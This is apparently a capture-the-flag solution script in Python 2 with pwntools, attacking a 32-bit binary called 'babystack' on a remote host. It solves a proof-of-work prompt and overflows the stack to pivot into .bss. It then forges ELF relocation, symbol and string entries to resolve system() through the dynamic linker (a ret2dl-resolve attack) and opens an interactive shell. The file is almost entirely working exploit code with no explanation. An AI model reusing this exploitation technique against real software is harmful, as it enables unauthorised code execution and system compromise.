#!/usr/bin/python
from pwn import *
from hashlib import sha256

def pow_solve(p):
    s = p.recvn(16)
    for i in range(256):
        for j in range(256):
            for k in range(256):
                for l in range(256):
                    if sha256(s + chr(i) + chr(j) + chr(k) + chr(l)).digest().startswith('\0\0\0'):
                        p.send(chr(i) + chr(j) + chr(k) + chr(l))
                        print s + chr(i) + chr(j) + chr(k) + chr(l)
                        return s

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
local = False
elf = ELF('./babystack')

if local:
  p = process('./babystack')
else:
  p = remote('202.120.7.202', 6666)
  pow_solve(p)

def r(delim='\n'):
  p.recvuntil(delim)

def s(st, line=True):
  if line:
    p.sendline(st)
  else:
    p.send(st)


bss = 0x0804a024
resolve = 0x080482F0
rel_table = 0x080482b0
sym_table = 0x080481cc
str_table = 0x0804822c
pppret = 0x080482E6
pret = 0x080484eb
ret = 0x08048486
leaveret = 0x080483a8
pay = 'a' * 40 + p32(bss+0x400)
pay += p32(elf.plt['read']) + p32(leaveret) + p32(0) + p32(bss+0x400) + p32(87)

#gdb.attach(p, '''b*0x080482F0
#''')
print len(pay)
s(pay, False)

pay = p32(0) + p32(elf.plt['read']) + p32(pppret) + p32(0) + p32(elf.got['__libc_start_main']) + p32(4) + p32(ret) + p32(pret)

pay += p32(resolve)*2 + p32(bss + 0x430 - rel_table)*2
k = ((bss + 0x438 - sym_table) << 4) | 7
fake_rel = p32(elf.got['alarm']) + p32(k)
fake_sym = p32(bss + 0x450 - str_table) + p32(0)*5
fake_str = 'system\x00'
pay += fake_rel + fake_sym + fake_str

print len(pay)
s(pay, False)

pay = ';sh\x00'
s(pay, False)

p.interactive()

